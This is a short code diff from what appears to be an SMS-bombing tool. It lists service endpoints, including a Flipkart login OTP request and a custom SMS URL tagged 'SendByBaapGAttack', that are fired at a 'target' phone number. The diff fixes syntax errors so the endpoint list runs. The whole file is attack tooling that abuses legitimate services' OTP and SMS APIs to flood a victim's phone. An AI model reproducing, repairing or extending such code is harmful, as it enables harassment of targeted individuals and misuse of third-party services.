@@ -6,12 +6,11 @@ apidata = {
 
 "Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=SendByBaapGAttack",{},"GET",'''000'''),
 
-"Flipkart":("https://2.rome.api.flipkart.com/1/action/view",{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":target,"clientQueryParamMap":{"ret":"/","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}},{},"POST","verification"
-)
+"Flipkart":("https://2.rome.api.flipkart.com/1/action/view",{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":target,"clientQueryParamMap":{"ret":"/","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}},{},"POST","verification")
 
 
 }
 
 
 
-apis = [apidata["Byjus"],apidata["Rummycircle"],apidata["Kisan"],apidata["Flipkart"]
+apis = [apidata["Byjus"],apidata["Rummycircle"],apidata["Kisan"],apidata["Flipkart"]]
